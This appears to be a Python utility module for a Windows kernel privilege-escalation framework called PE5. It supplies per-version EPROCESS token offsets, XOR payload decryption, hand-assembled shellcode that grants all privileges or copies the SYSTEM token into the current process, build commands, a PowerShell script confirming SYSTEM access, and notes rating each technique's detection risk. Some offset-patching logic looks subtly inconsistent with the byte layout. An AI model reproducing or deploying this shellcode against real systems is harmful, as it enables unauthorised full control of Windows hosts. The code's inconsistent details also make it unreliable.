"""PE5 Framework Utilities

Python utilities and wrappers for PE5 kernel-level privilege escalation.
These utilities provide Python interfaces to PE5 exploit mechanisms.

Note: These are documentation and command generation utilities.
Actual kernel-level exploitation requires compiled C code from pe5_framework.
"""

import struct
import os
from typing import Optional, Dict, List, Tuple


class PE5Utils:
    """Utilities for PE5 framework operations"""
    
    # PE5 Framework Constants
    PE5_SIZE = 22702
    PE5_SYSCALL_OFFSET = 0x2C10
    PE5_XOR_KEY = 0xA4
    KEY_DERIVE_OFFSET_1 = 3
    KEY_DERIVE_OFFSET_2 = 7
    
    # Windows Version Offsets
    WINDOWS_OFFSETS = {
        'Windows 10 1909': {
            'token': 0x360,
            'pid': 0x2E8,
            'links': 0x2F0,
            'image_file_name': 0x450
        },
        'Windows 10 2004+': {
            'token': 0x4B8,
            'pid': 0x440,
            'links': 0x448,
            'image_file_name': 0x5A8
        },
        'Windows 11': {
            'token': 0x4B8,
            'pid': 0x440,
            'links': 0x448,
            'image_file_name': 0x5A8
        },
        'Server 2019': {
            'token': 0x360,
            'pid': 0x2E8,
            'links': 0x2F0,
            'image_file_name': 0x450
        },
        'Server 2022': {
            'token': 0x4B8,
            'pid': 0x440,
            'links': 0x448,
            'image_file_name': 0x5A8
        }
    }
    
    @staticmethod
    def derive_xor_key(header_bytes: bytes) -> Optional[int]:
        """
        Derive XOR key from PE5 header bytes.
        
        Formula: key = header[3] ^ header[7]
        Expected: 0xA4
        
        Args:
            header_bytes: First 16 bytes of PE5 module
            
        Returns:
            Derived XOR key or None if insufficient bytes
        """
        if len(header_bytes) < 8:
            return None
        
        byte1 = header_bytes[PE5Utils.KEY_DERIVE_OFFSET_1]  # offset 3
        byte2 = header_bytes[PE5Utils.KEY_DERIVE_OFFSET_2]  # offset 7
        
        key = byte1 ^ byte2
        return key
    
    @staticmethod
    def decrypt_payload(encrypted_data: bytes, xor_key: int) -> bytes:
        """
        Decrypt PE5 payload using XOR key.
        
        Args:
            encrypted_data: Encrypted PE5 payload
            xor_key: XOR decryption key (typically 0xA4)
            
        Returns:
            Decrypted payload
        """
        decrypted = bytearray(encrypted_data)
        for i in range(len(decrypted)):
            decrypted[i] ^= xor_key
        return bytes(decrypted)
    
    @staticmethod
    def verify_syscall_location(decrypted_data: bytes) -> bool:
        """
        Verify SYSCALL instruction at expected offset.
        
        Args:
            decrypted_data: Decrypted PE5 payload
            
        Returns:
            True if SYSCALL bytes (0x0F 0x05) found at offset 0x2C10
        """
        if len(decrypted_data) < PE5Utils.PE5_SYSCALL_OFFSET + 2:
            return False
        
        syscall_bytes = decrypted_data[PE5Utils.PE5_SYSCALL_OFFSET:PE5Utils.PE5_SYSCALL_OFFSET + 2]
        return syscall_bytes == b'\x0F\x05'
    
    @staticmethod
    def get_windows_version_offsets(version: str) -> Optional[Dict[str, int]]:
        """
        Get kernel structure offsets for Windows version.
        
        Args:
            version: Windows version string
            
        Returns:
            Dictionary of offsets or None if version not found
        """
        return PE5Utils.WINDOWS_OFFSETS.get(version)
    
    @staticmethod
    def generate_token_modify_shellcode(token_offset: int = 0x4B8) -> bytes:
        """
        Generate position-independent shellcode for token modification.
        
        This shellcode:
        1. Gets current EPROCESS
        2. Reads Token pointer
        3. Modifies Privileges to grant all privileges
        
        Args:
            token_offset: Token offset in EPROCESS (default: 0x4B8)
            
        Returns:
            Shellcode bytes (57 bytes)
        """
        # This is a Python representation of the shellcode
        # Actual implementation would be in assembly
        shellcode_template = [
            # Get current EPROCESS
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  # mov rax, gs:[0x188]
            0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,              # mov rax, [rax+0xB8]
            
            # Get Token pointer
            0x48, 0x8B, 0x88, 0xB8, 0x04, 0x00, 0x00,              # mov rcx, [rax+0x4B8]
            0x48, 0x83, 0xE1, 0xF0,                                  # and rcx, 0xFFFFFFFFFFFFFFF0
            
            # Modify Privileges
            0x48, 0x83, 0xC1, 0x40,                                  # add rcx, 0x40
            0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF,              # mov rdx, 0xFFFFFFFFFFFFFFFF
            0x48, 0x89, 0x11,                                        # mov [rcx], rdx
            0x48, 0x89, 0x51, 0x08,                                  # mov [rcx+8], rdx
            0x48, 0x89, 0x51, 0x10,                                  # mov [rcx+0x10], rdx
            
            # Return success
            0x31, 0xC0,                                              # xor eax, eax
            0xC3                                                     # ret
        ]
        
        # Adjust token offset if different
        if token_offset != 0x4B8:
            # Replace token offset bytes (offset 15-17 in shellcode)
            offset_bytes = struct.pack('<I', token_offset)[:3]
            shellcode_template[15:18] = list(offset_bytes)
        
        return bytes(shellcode_template)
    
    @staticmethod
    def generate_token_steal_shellcode(token_offset: int = 0x4B8, 
                                       pid_offset: int = 0x440,
                                       links_offset: int = 0x448) -> bytes:
        """
        Generate position-independent shellcode for token stealing.
        
        This shellcode:
        1. Gets current EPROCESS
        2. Walks ActiveProcessLinks to find SYSTEM (PID 4)
        3. Copies SYSTEM token to current process
        
        Args:
            token_offset: Token offset in EPROCESS
            pid_offset: UniqueProcessId offset
            links_offset: ActiveProcessLinks offset
            
        Returns:
            Shellcode bytes (~70 bytes)
        """
        # This is a Python representation
        # Actual implementation would be in assembly
        shellcode_template = [
            # Get current EPROCESS
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  # mov rax, gs:[0x188]
            0x4C, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,              # mov r8, [rax+0xB8]
            0x4D, 0x89, 0xC1,                                        # mov r9, r8
            
            # Walk ActiveProcessLinks
            # Loop start
            0x49, 0x8B, 0x81, 0x40, 0x04, 0x00, 0x00,              # mov rax, [r9+0x440]
            0x48, 0x83, 0xF8, 0x04,                                  # cmp rax, 4
            0x74, 0x10,                                               # je found_system
            0x4D, 0x8B, 0x89, 0x48, 0x04, 0x00, 0x00,              # mov r9, [r9+0x448]
            0x49, 0x81, 0xE9, 0x48, 0x04, 0x00, 0x00,              # sub r9, 0x448
            0x4D, 0x39, 0xC1,                                        # cmp r9, r8
            0x75, 0xE0,                                              # jne loop_start
            0xEB, 0x18,                                              # jmp failed
            
            # found_system: Copy token
            0x49, 0x8B, 0x81, 0xB8, 0x04, 0x00, 0x00,              # mov rax, [r9+0x4B8]
            0x48, 0x83, 0xE0, 0xF0,                                  # and rax, 0xFFFFFFFFFFFFFFF0
            0x48, 0x83, 0xC8, 0x07,                                  # or rax, 0x7
            0x49, 0x89, 0x80, 0xB8, 0x04, 0x00, 0x00,              # mov [r8+0x4B8], rax
            0x31, 0xC0,                                              # xor eax, eax
            0xC3,                                                    # ret
            
            # failed:
            0xB8, 0x01, 0x00, 0x00, 0xC0,                          # mov eax, 0xC0000001
            0xC3                                                     # ret
        ]
        
        # Adjust offsets if different
        # This is simplified - actual implementation would need proper offset patching
        return bytes(shellcode_template)
    
    @staticmethod
    def generate_build_commands() -> List[str]:
        """
        Generate build commands for PE5 framework.
        
        Returns:
            List of build command strings
        """
        commands = [
            "# Build PE5 exploit framework",
            "cd pe5_framework_extracted/pe5_framework",
            "",
            "# Method 1: Python build script",
            "python build.py all",
            "",
            "# Method 2: Windows batch script",
            "build.bat all",
            "",
            "# Method 3: CMake",
            "mkdir build && cd build",
            "cmake .. -G \"Visual Studio 17 2022\" -A x64",
            "cmake --build . --config Release",
            "",
            "# Method 4: NMAKE",
            "nmake all"
        ]
        return commands
    
    @staticmethod
    def generate_exploit_verification_script() -> str:
        """
        Generate PowerShell script to verify privilege escalation.
        
        Returns:
            PowerShell script string
        """
        script = """
# Verify SYSTEM privileges after PE5 exploit
$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$isSystem = ($token.User.Value -eq 'S-1-5-18')
$principal = New-Object System.Security.Principal.WindowsPrincipal($token)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

Write-Host "Current User: $($token.Name)"
Write-Host "User SID: $($token.User.Value)"
Write-Host "Is SYSTEM: $isSystem"
Write-Host "Is Administrator: $isAdmin"
Write-Host "Has Elevated Token: $($token.Token.HasElevatedPrivileges)"

# Check specific privileges
whoami /priv

# Try accessing protected resource
try {
    $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')
    if ($reg) {
        Write-Host "[+] Can access HKLM\\SYSTEM (elevated privileges)"
        $reg.Close()
    }
} catch {
    Write-Host "[-] Cannot access HKLM\\SYSTEM (no elevated privileges)"
}
"""
        return script.strip()
    
    @staticmethod
    def get_technique_info() -> Dict[str, Dict[str, str]]:
        """
        Get information about PE5 exploitation techniques.
        
        Returns:
            Dictionary of technique information
        """
        return {
            'Direct Privilege Modification': {
                'description': 'Directly writes to TOKEN.Privileges',
                'speed': 'Fastest (~1 microsecond)',
                'reliability': 'High',
                'detection': 'Medium'
            },
            'Token Stealing': {
                'description': 'Copies SYSTEM process token (PID 4)',
                'speed': 'Fast (~2 microseconds)',
                'reliability': 'Very High',
                'detection': 'Low'
            },
            'Integrity Level Elevation': {
                'description': 'Modifies token integrity level to System',
                'speed': 'Fast (~1.5 microseconds)',
                'reliability': 'High',
                'detection': 'Medium'
            },
            'Full Token Takeover': {
                'description': 'Complete token manipulation',
                'speed': 'Moderate (~3 microseconds)',
                'reliability': 'Very High',
                'detection': 'Low'
            }
        }
